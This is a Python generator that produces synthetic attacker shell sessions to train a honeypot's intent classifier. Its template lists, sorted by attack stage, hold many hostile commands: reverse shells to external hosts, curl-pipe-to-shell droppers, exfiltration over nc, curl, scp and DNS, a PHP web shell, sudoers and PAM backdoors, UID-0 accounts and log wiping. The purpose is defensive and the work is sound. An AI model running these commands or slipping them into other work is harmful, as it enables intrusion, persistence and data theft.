"""Generated training data for the intent model, shaped like live traffic.

What the model is asked at runtime
----------------------------------
The sidecar posts the last three commands of a session and their timestamps
-- nothing else (brain_courier.py). So training samples are exactly that:
sliding windows over generated sessions, each labelled with the stage the
attacker is in at the window's newest command, the same convention the
hand-labelled evaluation uses (eval_transcripts.py).

What the previous generator got wrong
-------------------------------------
Every one of these let the model score 1.000 in cross-validation without
learning anything about commands:

  * Each class had its own fixed number of timestamps and its own spacing, so
    timestamps alone predicted the label 98.7% of the time.
  * `raw_activity` carried the class name ("recon", "persistence").
  * Every sample had http_logs and db_queries, which live traffic never has.
  * 67 distinct commands in total, so any held-out split was memorised.

Here the tempo is a property of the session (a bot or a human at a keyboard)
and is drawn independently of what the session does; there is no free text;
and commands are rendered from templates with varied hosts, users, paths and
payloads. `tests/test_intent_eval.py` checks that tempo alone stays near chance.

Hosts, users and addresses here are deliberately generic (web01, 10.x, ...).
The evaluation transcripts use the honeypot's own estate (erp-web, db-01,
10.60.0.x), so a model that scores well there has generalised rather than
memorised names.
"""

from __future__ import annotations

import re
import string
from datetime import datetime, timedelta, timezone
from random import Random
from typing import Callable, Final

R = "reconnaissance"
P = "privilege_escalation"
S = "persistence"
L = "lateral_movement"
X = "data_exfiltration"

#: Bumped whenever the generator changes, so a model trained on an older
#: version is recognised as stale (pipeline.load_or_train). Bump it too when a
#: feature's computation changes but its name does not: the fingerprint's
#: feature-name hash cannot see that.
DATASET_VERSION: Final[str] = "9"

#: Commands per window and the smallest window the sidecar classifies.
WINDOW: Final[int] = 3
MIN_WINDOW: Final[int] = 2
#: The sidecar classifies every CLASSIFY_EVERY commands, so the previous
#: intent a window can be told about belongs to the window that many back.
CLASSIFY_EVERY: Final[int] = 2

#: How often the previous intent given to a training window is missing or
#: wrong. Live it is the brain's own last answer, right about nine times in
#: ten, so the model must learn to use it without trusting it blindly.
_PREVIOUS_MISSING_RATE: Final[float] = 0.15
_PREVIOUS_WRONG_RATE: Final[float] = 0.10
#: How often a training window carries no timestamps. The sidecar always
#: sends them, but /intent-classify does not require them, and a model that
#: never saw a window without them read the missing tempo as a signal: with no
#: timestamps, a heredoc typed during reconnaissance came out as privilege
#: escalation.
_TIMESTAMPS_MISSING_RATE: Final[float] = 0.10


# --------------------------------------------------------------------------
# slot values
# --------------------------------------------------------------------------

_USERS = ["admin", "ubuntu", "deploy", "git", "oracle", "jenkins", "pi", "centos", "ec2-user", "backup", "svc_app", "dev", "test"]
_HOSTS = ["web01", "app-02", "build03", "db-prod", "cache01", "ci-runner", "files02", "mail01", "vpn-gw", "k8s-node1", "nas01", "wiki"]
_DIRS = ["/var/www/html", "/srv/app", "/opt/app", "/data", "/backup", "/var/lib/mysql", "/home/{user}", "/opt/backups", "/srv/share", "/var/log"]
_CONFIGS = ["/var/www/html/wp-config.php", "/srv/app/.env", "/opt/app/config.yml", "/etc/nginx/nginx.conf", "/srv/app/database.yml", "/opt/app/settings.ini", "/var/www/html/config.php", "/etc/mysql/my.cnf"]
_PAYLOADS = ["/tmp/.x", "/tmp/.k", "/var/tmp/.s", "/dev/shm/.d", "/tmp/kdevtmpfsi", "/tmp/xmrig", "/tmp/.cache/upd", "/var/tmp/dbus"]
_SERVICES = ["sshd", "nginx", "mysql", "apache2", "docker", "cron", "redis", "postgres"]
_DBS = ["app", "prod", "wordpress", "shop", "billing", "crm", "hr"]
_TABLES = ["users", "customers", "orders", "payments", "accounts", "employees", "invoices", "patients"]
_SVC_NAMES = ["dbus-helper", "netmon", "sysupdate", "kthreadd2", "systemd-net", "logrotate2", "snapd-sync"]
_STAGES = ["/tmp/.d.tgz", "/tmp/out.zip", "/dev/shm/a.tar.gz", "/var/tmp/b.tgz", "/tmp/dump.sql", "/tmp/.c.gz"]
_CRON = ["* * * * *", "*/5 * * * *", "*/10 * * * *", "@reboot", "0 * * * *", "*/2 * * * *"]
_PORTS = ["22", "80", "443", "3306", "5432", "6379", "8080", "9200", "4444", "8443"]
_SUBNETS = ["10.0.0.0/24", "10.1.2.0/24", "172.16.5.0/24", "192.168.1.0/24", "10.10.0.0/16", "172.20.0.0/24"]
_EXPLOITS = ["dirtypipe", "cve-2021-3156", "pwnkit", "overlayfs", "exp", "cve-2022-0847", "sudo-baron"]
_BUCKETS = ["prod-backups", "company-assets", "logs-archive", "db-snapshots"]
_DATAFILES = [
    "/home/{user}/Documents/payroll.xlsx", "/srv/app/data/customers.csv", "/var/backups/{db}.sql",
    "/home/{user}/passwords.kdbx", "/opt/app/app.db", "/srv/share/finance/q3_report.xlsx",
    "/var/lib/app/exports/users.csv", "/home/{user}/backup/{db}.dump",
]


def _iip(rng: Random) -> str:
    choice = rng.random()
    if choice < 0.5:
        return f"10.{rng.randint(0, 40)}.{rng.randint(0, 255)}.{rng.randint(2, 254)}"
    if choice < 0.8:
        return f"172.{rng.randint(16, 31)}.{rng.randint(0, 255)}.{rng.randint(2, 254)}"
    return f"192.168.{rng.randint(0, 20)}.{rng.randint(2, 254)}"


def _eip(rng: Random) -> str:
    first = rng.choice([5, 23, 31, 45, 46, 62, 77, 85, 89, 91, 94, 103, 109, 139, 141, 146, 154, 176, 185, 193, 194, 212])
    return f"{first}.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(2, 254)}"


def _secret(rng: Random) -> str:
    alphabet = string.ascii_letters + string.digits
    return "".join(rng.choice(alphabet) for _ in range(rng.randint(8, 14))) + rng.choice(["!", "#", "1", "@", "9"])


def _pubkey(rng: Random) -> str:
    alphabet = string.ascii_letters + string.digits + "+/"
    body = "".join(rng.choice(alphabet) for _ in range(rng.randint(40, 70)))
    kind = rng.choice(["ssh-rsa AAAAB3NzaC1yc2E", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5"])
    return f"{kind}{body} {rng.choice(['root@kali', 'x@vps', 'admin', 'key', 'user@box'])}"


_SLOTS: dict[str, Callable[[Random], str]] = {
    "user": lambda rng: rng.choice(_USERS),
    "user2": lambda rng: rng.choice(_USERS),
    "host": lambda rng: rng.choice(_HOSTS),
    "iip": _iip,
    "iip2": _iip,
    "eip": _eip,
    "dir": lambda rng: rng.choice(_DIRS),
    "config": lambda rng: rng.choice(_CONFIGS),
    "payload": lambda rng: rng.choice(_PAYLOADS),
    "svc": lambda rng: rng.choice(_SERVICES),
    "svcname": lambda rng: rng.choice(_SVC_NAMES),
    "db": lambda rng: rng.choice(_DBS),
    "table": lambda rng: rng.choice(_TABLES),
    "stage": lambda rng: rng.choice(_STAGES),
    "cron": lambda rng: rng.choice(_CRON),
    "port": lambda rng: rng.choice(_PORTS),
    "subnet": lambda rng: rng.choice(_SUBNETS),
    "exploit": lambda rng: rng.choice(_EXPLOITS),
    "bucket": lambda rng: rng.choice(_BUCKETS),
    "datafile": lambda rng: rng.choice(_DATAFILES),
    "pass": _secret,
    "pubkey": _pubkey,
    "n": lambda rng: str(rng.choice([5, 10, 20, 50])),
    "key": lambda rng: rng.choice(["~/.ssh/id_rsa", "/tmp/id", "~/.ssh/id_ed25519", "/root/.ssh/backup_key", "./key.pem"]),
}


# --------------------------------------------------------------------------
# command templates, by stage (see the labelling guide in eval_transcripts.py)
# --------------------------------------------------------------------------

TEMPLATES: Final[dict[str, tuple[str, ...]]] = {
    R: (
        "uname -a", "uname -r", "uname -m", "uname -snrvm", "cat /etc/os-release", "cat /etc/issue", "cat /proc/version",
        "lsb_release -a", "hostnamectl", "hostname", "hostname -I", "whoami", "id", "id {user}", "w", "who", "last",
        "last -n {n}", "lastlog | head -{n}", "groups", "getent group sudo", "cat /etc/passwd", "getent passwd",
        "cut -d: -f1 /etc/passwd", "grep -v nologin /etc/passwd", "ls -la /home", "ls -la /home/{user}", "ls -la ~",
        "ls -la {dir}", "ls {dir}", "ls -lat /tmp", "ps aux", "ps -ef", "ps aux | grep {svc}", "ps -eo user,cmd | head -{n}",
        "top -bn1 | head -{n}", "pstree -p", "netstat -tulpn", "netstat -antp", "netstat -rn", "ss -tulpn", "ss -antp",
        "ip a", "ip addr show", "ip route", "ip neigh", "ifconfig", "arp -n", "cat /etc/hosts", "cat /etc/resolv.conf",
        "cat /proc/cpuinfo | grep 'model name' | uniq", "cat /proc/cpuinfo | grep processor | wc -l", "nproc", "lscpu",
        "free -m", "free -h", "df -h", "df -hT", "uptime", "lsblk", "mount | column -t", "env", "printenv", "echo $PATH",
        "history", "cat ~/.bash_history", "tail -n {n} ~/.bash_history", "find / -name '*.conf' 2>/dev/null | head",
        "find {dir} -type f -name '*.php'", "find / -name '*.sql' 2>/dev/null", "find / -name 'id_rsa*' 2>/dev/null",
        "locate wp-config.php", "grep -ri 'password' {dir} 2>/dev/null | head", "grep -rn 'DB_PASS' {dir}",
        "grep -i secret {config}", "cat {config}", "head -n {n} {config}", "less {config}", "cat ~/.ssh/config",
        "cat ~/.ssh/known_hosts", "ls -la ~/.ssh", "cat ~/.ssh/authorized_keys", "cat ~/.aws/credentials",
        "cat ~/.git-credentials", "cat ~/.docker/config.json", "nmap -sV {subnet}", "nmap -p {port} {iip}",
        "nmap -sn {subnet}", "nmap -Pn -p- {iip}", "ping -c 1 {host}", "ping -c 3 {iip}", "nc -zv {iip} {port}",
        "nc -z -w1 {host} {port}", "curl -I http://{host}/", "curl -s http://{host}:{port}/ | head", "curl -sk https://{iip}/login",
        "wget -qO- http://{host}/ | head", "dig {host}", "nslookup {host}", "systemctl list-units --type=service",
        "systemctl status {svc}", "service --status-all", "docker ps", "docker images", "crontab -l", "cat /etc/crontab",
        "ls -la /etc/cron.d", "which python3 gcc nc wget curl", "ls -la /var/log", "tail -n {n} /var/log/auth.log",
        "journalctl -n {n}", "iptables -L -n", "dpkg -l | head -{n}", "lsof -i", "cat /etc/ssh/sshd_config | grep -v '^#'",
        "aws s3 ls", "aws sts get-caller-identity", "kubectl get pods -A",
        "mysql -u {user} -p{pass} -e 'show databases'", "mysql -u root -e 'select user,host from mysql.user'",
        "psql -U postgres -c '\\l'", "mysql -h {host} -u {user} -p{pass} -e 'show tables' {db}",
        # software, time, policy and share discovery; cloud and cluster reconnaissance
        "dpkg -l | grep {svc}", "rpm -qa | head -{n}", "apt list --installed 2>/dev/null | head", "pip3 list",
        "date", "timedatectl", "lsmod", "grep PASS_MAX /etc/login.defs", "chage -l {user}", "showmount -e {iip}",
        "smbclient -L //{iip} -N", "aws ec2 describe-instances --region us-east-1", "aws iam list-users",
        "gcloud compute instances list", "kubectl describe pod {svcname}", "kubectl auth can-i --list",
        "docker inspect {svcname}", "cat ~/.bashrc", "cat ~/.profile", "tail -n {n} /var/log/syslog",
        "curl -s http://169.254.169.254/latest/meta-data/",
        # datastores, disks, containers and mounts
        "redis-cli -h {host} info", "redis-cli -h {host} --scan --pattern '*' | head",
        "mongo --quiet --eval 'db.adminCommand({{listDatabases: 1}})'", "psql -h {host} -U {user} -l",
        "fdisk -l", "blkid", "nvidia-smi", "lxc list", "lxc image list", "mount", "cat /etc/fstab", "cat /etc/exports",
    ),
    P: (
        "sudo -l", "sudo -V", "sudo -n true", "sudo su", "sudo su -", "sudo -i", "sudo -s", "sudo bash", "su", "su -",
        "su root", "su - {user}", "sudo cat /etc/shadow", "sudo cp {config} /tmp/", "sudo vi /etc/hosts",
        "find / -perm -4000 -type f 2>/dev/null", "find / -perm -u=s -type f 2>/dev/null", "find / -perm -2000 2>/dev/null",
        "find / -writable -type d 2>/dev/null | head", "getcap -r / 2>/dev/null", "cat /etc/sudoers",
        "ls -la /etc/sudoers.d", "cat /etc/shadow", "ls -la /etc/shadow", "chmod u+s /bin/bash", "chmod +s /usr/bin/find",
        "cp /bin/bash /tmp/.b && chmod 4755 /tmp/.b", "/tmp/.b -p", "setcap cap_setuid+ep /usr/bin/python3",
        "pkexec /bin/sh", "doas sh", "sudo find . -exec /bin/sh \\; -quit", "sudo vim -c ':!/bin/sh'",
        "sudo awk 'BEGIN {{system(\"/bin/sh\")}}'", "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
        "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", "gcc {exploit}.c -o /tmp/{exploit}",
        "./{exploit}", "chmod +x {exploit} && ./{exploit}", "wget http://{eip}/linpeas.sh -O- | sh",
        "curl -sL http://{eip}/lse.sh | bash", "./linpeas.sh", "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        "docker run --privileged -it ubuntu bash", "unshadow /etc/passwd /etc/shadow > /tmp/h", "john /tmp/h",
        "john --show /tmp/h", "hashcat -m 1800 /tmp/h rockyou.txt", "echo '{user} ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
        "sudo -u {user} /bin/bash", "searchsploit linux kernel privilege",
        "cat /etc/sudoers.d/*", "stat /etc/sudoers", "nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
        "searchsploit sudo 1.8", "sudo tail -n 20 /var/log/auth.log", "sudo iptables -L -n",
        # lxd, host disks, SUID shells and hijacked privileged scripts
        "lxc init ubuntu:22.04 x -c security.privileged=true",
        "lxc config device add x root disk source=/ path=/mnt/root recursive=true", "lxc exec x /bin/sh",
        "mount /dev/sda1 /mnt/host", "chroot /mnt/host /bin/bash", "bash -p",
        "echo 'chmod +s /bin/bash' >> /opt/{svcname}/cleanup.sh",
        "echo 'cp /bin/bash /tmp/.r; chmod 4755 /tmp/.r' >> /usr/local/bin/{svcname}.sh",
    ),
    S: (
        "crontab -e", "(crontab -l 2>/dev/null; echo '{cron} {payload}') | crontab -", "echo '{cron} root {payload}' >> /etc/crontab",
        "echo '{cron} {payload} >/dev/null 2>&1' > /etc/cron.d/{svcname}", "crontab /tmp/cron.txt", "crontab -r",
        "echo '{pubkey}' >> ~/.ssh/authorized_keys", "mkdir -p ~/.ssh && echo '{pubkey}' >> ~/.ssh/authorized_keys",
        "echo '{pubkey}' > /root/.ssh/authorized_keys", "cat /tmp/k.pub >> /root/.ssh/authorized_keys",
        "chattr +i ~/.ssh/authorized_keys", "chattr +ia /etc/passwd", "useradd -m -s /bin/bash {user2}",
        "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash {user2}", "adduser --disabled-password --gecos '' {user2}",
        "usermod -aG sudo {user2}", "echo '{user2}:{pass}' | chpasswd", "echo 'root:{pass}' | chpasswd", "passwd {user2}",
        "passwd", "echo '{payload} &' >> /etc/rc.local", "echo 'bash -i >& /dev/tcp/{eip}/{port} 0>&1' >> ~/.bashrc",
        "echo '{payload}' >> /etc/profile", "echo 'nohup {payload} &' >> ~/.profile", "cp {payload} /usr/local/bin/{svcname}",
        "cp {payload} /usr/bin/{svcname} && chmod +x /usr/bin/{svcname}", "systemctl enable {svcname}",
        "systemctl enable --now {svcname}.service", "systemctl daemon-reload",
        "printf '[Service]\\nExecStart={payload}\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/{svcname}.service",
        "update-rc.d {svcname} defaults", "ln -s {payload} /etc/init.d/{svcname}", "echo {payload} > /etc/ld.so.preload",
        "at now + 1 minute < /tmp/job.sh", "vi /etc/crontab", "nano ~/.ssh/authorized_keys",
        # config tampering, PAM, motd, web shells, account files, kernel modules
        "sed -i 's/^#\\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config",
        "sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config",
        "perl -pi -e 's/^AllowUsers.*//' /etc/ssh/sshd_config",
        "echo 'auth sufficient pam_permit.so' >> /etc/pam.d/sshd",
        "echo '{payload} &' > /etc/update-motd.d/99-update",
        "echo '<?php system($_REQUEST[\"c\"]); ?>' > /var/www/html/.status.php",
        "echo '{user2}:x:0:0::/root:/bin/bash' >> /etc/passwd",
        "insmod /tmp/{svcname}.ko", "modprobe {svcname}", "sudo sed -i 's/^#Port 22/Port 22/' /etc/ssh/sshd_config",
        # cloud credentials, application backdoors, database accounts
        "aws iam create-access-key --user-name {user2}", "aws iam create-user --user-name {user2}",
        "aws iam attach-user-policy --user-name {user2} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
        "gcloud projects add-iam-policy-binding prod --member user:{user2}@example.net --role roles/owner",
        "sed -i 's/def auth(/def auth(u, p):\\n    _log(u, p)\\ndef _auth(/' /opt/app/app.py",
        "echo 'require \"/tmp/.x.php\";' >> /var/www/html/index.php",
        "mysql -u root -e \"CREATE USER 'bk'@'%' IDENTIFIED BY '{pass}'; GRANT ALL ON *.* TO 'bk'@'%'\"",
    ),
    L: (
        "ssh {user}@{host}", "ssh {user}@{iip}", "ssh -i {key} {user}@{host}", "ssh -i {key} -o StrictHostKeyChecking=no {user}@{iip}",
        "ssh -p 2222 {user}@{iip}", "ssh {user}@{iip} 'id; hostname'", "ssh -o BatchMode=yes {user}@{host} uptime",
        "sshpass -p '{pass}' ssh {user}@{iip}", "sshpass -p '{pass}' scp {stage} {user}@{iip}:/tmp/",
        "scp {key} {user}@{iip}:/tmp/", "scp -i {key} /tmp/tool {user}@{host}:/tmp/", "scp {user}@{iip}:{config} /tmp/",
        "sftp {user}@{host}", "rsync -az {dir} {user}@{iip}:/tmp/", "ssh-copy-id -i {key}.pub {user}@{iip}",
        "for ip in {iip} {iip2}; do ssh -o ConnectTimeout=2 {user}@$ip hostname; done",
        "for h in $(cat /tmp/hosts); do sshpass -p '{pass}' ssh {user}@$h id; done",
        "mount -t cifs //{iip}/share /mnt -o user={user}", "smbclient //{iip}/share -U {user}", "smbclient -L //{host} -N",
        "ssh -L {port}:{iip}:{port} {user}@{host} -N", "ssh -D 1080 {user}@{iip} -f -N", "proxychains ssh {user}@{iip}",
        "mysql -h {iip} -u {user} -p{pass}", "psql -h {host} -U {user} {db}",
        # containers, orchestration and fleet tools
        "kubectl exec -it {svcname} -- /bin/sh", "docker exec -it {svcname} bash", "kubectl cp {svcname}:/etc/passwd /tmp/p",
        "ansible all -i /tmp/hosts -m shell -a 'id'", "pssh -h /tmp/hosts -i uptime", "salt '*' cmd.run 'whoami'",
        "telnet {iip} 23",
        # guessing credentials for the next host
        "hydra -l root -P /tmp/pw.txt ssh://{iip}", "medusa -h {iip} -u admin -P /tmp/pw -M ssh",
        "ncrack -p 22 --user root -P /tmp/pw {iip}",
    ),
    X: (
        "tar czf {stage} {dir}", "tar -cvzf {stage} {dir}", "tar cf - {dir} | gzip > {stage}", "zip -r {stage} {dir}",
        "zip -r -P {pass} /tmp/x.zip {dir}", "gzip -9 /tmp/dump.sql", "7z a /tmp/a.7z {dir}", "split -b 10M {stage} /tmp/part.",
        "base64 -w0 {stage} > /tmp/.b64", "base64 {stage} > /tmp/out.txt", "xxd -p {stage} > /tmp/hex",
        "mysqldump -u {user} -p{pass} {db} > /tmp/dump.sql", "mysqldump -h {host} -u {user} -p{pass} --all-databases > /tmp/all.sql",
        "pg_dump -h {host} -U {user} {db} > /tmp/{db}.sql", "pg_dumpall -U postgres > /tmp/all.sql", "mongodump --out /tmp/mongo",
        "mysql -u {user} -p{pass} -e 'select * from {table}' {db}", "mysql -h {host} -u {user} -p{pass} -e 'select email,password from {db}.{table}'",
        "mysql -u {user} -p{pass} {db} -e 'select * from {table}' > /tmp/{table}.csv",
        "psql -h {host} -U {user} -d {db} -c 'select * from {table}'", "sqlite3 /srv/app/app.db .dump > /tmp/app.sql",
        "curl -F 'file=@{stage}' http://{eip}/upload", "curl -T {stage} ftp://{eip}/", "curl --upload-file {stage} https://transfer.sh/x",
        "curl -X POST --data-binary @{stage} http://{eip}:{port}/", "wget --post-file={stage} http://{eip}/u",
        "scp {stage} {user}@{eip}:/tmp/", "rsync -az {stage} {user}@{eip}:/drop/", "nc {eip} {port} < {stage}",
        "cat {stage} | nc {eip} {port}", "python3 -m http.server {port}", "python -m SimpleHTTPServer {port}",
        "aws s3 cp {stage} s3://{bucket}/", "aws s3 sync {dir} s3://{bucket}/", "rclone copy {dir} remote:loot",
        # encryption, staging, collection, raw sockets, other transfer channels
        "gpg -c --batch --passphrase {pass} {stage}", "gpg --symmetric {stage}",
        "openssl enc -aes-256-cbc -salt -in {stage} -out {stage}.enc -k {pass}",
        "cp {datafile} /tmp/.{n}", "mv {datafile} /dev/shm/.d", "cp {datafile} /var/tmp/.cache/",
        "cat /srv/app/data/customers.csv", "head -n {n} /var/backups/{db}.sql",
        "dd if=/dev/sda bs=1M | gzip | nc {eip} {port}", "cat {stage} > /dev/tcp/{eip}/{port}",
        "tftp {eip} -c put {stage}", "lftp -e 'put {stage}; bye' ftp://{eip}", "ncftpput -u anonymous {eip} /incoming {stage}",
        "redis-cli -h {host} --rdb /tmp/dump.rdb", "az storage blob upload --container-name loot --file {stage} --name x",
        # DNS tunnels and ftp
        "for c in $(cat /tmp/.e); do dig +short $c.{eip}.nip.io; done",
        "nslookup $(base64 -w0 /tmp/k | cut -c1-60).d.example.org", "iodine -f {eip} t.example.org",
        "ftp -n {eip}", "put {stage}", "mput /tmp/*.tgz", "lftp -u anonymous, ftp://{eip}",
    ),
}

#: Commands with no stage of their own. They appear inside every stage, and a
#: window made only of them is, correctly, close to a guess.
NEUTRAL: Final[tuple[str, ...]] = (
    "cd {dir}", "cd /tmp", "cd ~", "cd ..", "pwd", "clear", "exit", "ls", "bash", "sh", "export TERM=xterm",
    "unset HISTFILE", "history -c", "chmod +x {payload}", "{payload}", "./run.sh", "sh /tmp/x.sh", "rm -f {payload}",
    "rm -rf /tmp/*", "wget http://{eip}/x.sh -O /tmp/x.sh", "curl -s -o {payload} http://{eip}/bin", "nano notes.txt",
    "echo ok", "sleep 2", "pkill -f xmrig", "kill -9 1337", "mkdir -p /tmp/.w", "touch /tmp/t", "cat notes.txt",
    # covering tracks: no stage of its own in this taxonomy
    "iptables -F", "rm -rf /var/log/*", "shred -u ~/.bash_history", "export HISTSIZE=0",
    "ln -sf /dev/null ~/.bash_history", "touch -r /etc/hostname {payload}", "systemctl stop rsyslog",
    # fetch-and-run droppers: these appeared only as privilege-escalation
    # tooling (lse.sh, linpeas) before, so the model read every `curl | bash`
    # as privilege escalation, at 0.99 on a bot's loader
    "curl -s http://{eip}/ldr.sh | bash", "wget -qO- http://{eip}/i.sh | sh", "curl -fsSL http://{eip}/x | sh",
    # lines typed into a heredoc, which the recorder sees as commands
    "[Unit]", "[Service]", "[Install]", "Description=system helper", "ExecStart={payload}", "Restart=always",
    "WantedBy=multi-user.target", "EOF",
)


# --------------------------------------------------------------------------
# sessions
# --------------------------------------------------------------------------

_SLOT = re.compile(r"\{(\w+)\}")

#: Where sessions start, and where they go next. Mostly forward along the kill
#: chain, often back to reconnaissance -- landing on a new host means looking
#: around again.
_START: Final[dict[str, float]] = {R: 0.78, P: 0.06, S: 0.08, L: 0.03, X: 0.05}
_NEXT: Final[dict[str, dict[str, float]]] = {
    R: {P: 0.32, S: 0.2, L: 0.25, X: 0.23},
    P: {R: 0.2, S: 0.35, L: 0.2, X: 0.25},
    S: {R: 0.3, P: 0.1, L: 0.3, X: 0.3},
    L: {R: 0.5, P: 0.15, S: 0.1, X: 0.25},
    X: {R: 0.3, P: 0.2, S: 0.2, L: 0.3},
}
_NEUTRAL_RATE: Final[float] = 0.18
#: Chance per stage of a run of 2-5 neutral commands in a row -- the body of
#: a heredoc, a dropper's cd/wget/chmod/run, cleanup. Real sessions have them,
#: and without them a window of nothing but neutral commands almost never
#: occurred in training, so the model never learned that the session's
#: previous stage is the only answer there and ignored it.
_NEUTRAL_BURST_RATE: Final[float] = 0.3
_GAPS: Final[dict[str, tuple[float, float]]] = {"bot": (0.2, 1.6), "human": (2.0, 40.0)}


def _render(template: str, rng: Random) -> str:
    rendered = _SLOT.sub(lambda m: _SLOTS[m.group(1)](rng), template)
    # Templates nest one level ({dir} may contain {user}).
    return _SLOT.sub(lambda m: _SLOTS[m.group(1)](rng), rendered).replace("{{", "{").replace("}}", "}")


def _weighted(rng: Random, weights: dict[str, float]) -> str:
    roll = rng.random() * sum(weights.values())
    for key, weight in weights.items():
        roll -= weight
        if roll <= 0:
            return key
    return key


def generate_session(rng: Random) -> tuple[list[tuple[str, str]], list[str]]:
    """One attacker session: (command, stage) steps and their timestamps."""
    tempo = "bot" if rng.random() < 0.45 else "human"
    steps: list[tuple[str, str]] = []
    stage = _weighted(rng, _START)
    for _ in range(rng.randint(1, 5)):
        length = rng.randint(2, 6) if stage == R else rng.randint(1, 4)
        burst_at = rng.randrange(length) if rng.random() < _NEUTRAL_BURST_RATE else -1
        for index in range(length):
            if rng.random() < _NEUTRAL_RATE:
                # A neutral command takes the stage it follows, as
                # eval_transcripts.resolved_labels labels it; only with nothing
                # before it does it take the stage that comes next. Labelling it
                # with the next stage taught the model that a pause after
                # reconnaissance means privilege escalation is under way.
                steps.append((_render(rng.choice(NEUTRAL), rng), steps[-1][1] if steps else stage))
            steps.append((_render(rng.choice(TEMPLATES[stage]), rng), stage))
            if index == burst_at:
                steps.extend((_render(rng.choice(NEUTRAL), rng), stage) for _ in range(rng.randint(2, 5)))
        stage = _weighted(rng, _NEXT[stage])

    low, high = _GAPS[tempo]
    moment = datetime(2026, 1, 1, tzinfo=timezone.utc) + timedelta(seconds=rng.randint(0, 300 * 86400))
    stamps = []
    for _ in steps:
        stamps.append(moment.strftime("%Y-%m-%dT%H:%M:%S.%fZ"))
        moment += timedelta(seconds=rng.uniform(low, high))
    return steps, stamps


def session_windows(
    steps: list[tuple[str, str]], stamps: list[str], rng: Random | None = None
) -> list[dict[str, object]]:
    """The windows the sidecar would classify over one session.

    Each carries `previous_intent` -- the label of the window CLASSIFY_EVERY
    commands back -- as the sidecar would send it. With `rng`, that context is
    sometimes dropped or replaced with a wrong stage (see the rates above).
    """
    windows: list[dict[str, object]] = []
    labels_by_end: dict[int, str] = {}
    for end in range(MIN_WINDOW, len(steps) + 1):
        start = max(0, end - WINDOW)
        label = steps[end - 1][1]
        previous = labels_by_end.get(end - CLASSIFY_EVERY)
        if previous is not None and rng is not None:
            roll = rng.random()
            if roll < _PREVIOUS_MISSING_RATE:
                previous = None
            elif roll < _PREVIOUS_MISSING_RATE + _PREVIOUS_WRONG_RATE:
                previous = rng.choice([stage for stage in TEMPLATES if stage != previous])
        window: dict[str, object] = {
            "commands": [command for command, _ in steps[start:end]],
            "event_timestamps": stamps[start:end],
            "label": label,
        }
        if rng is not None and rng.random() < _TIMESTAMPS_MISSING_RATE:
            window["event_timestamps"] = []
        if previous is not None:
            window["previous_intent"] = previous
        windows.append(window)
        labels_by_end[end] = label
    return windows


def build_training_dataset(seed: int = 42, sessions: int = 2500) -> list[dict[str, object]]:
    """Sliding windows over `sessions` generated sessions, shuffled."""
    rng = Random(seed)
    dataset: list[dict[str, object]] = []
    for _ in range(sessions):
        steps, stamps = generate_session(rng)
        dataset.extend(session_windows(steps, stamps, rng))
    rng.shuffle(dataset)
    return dataset
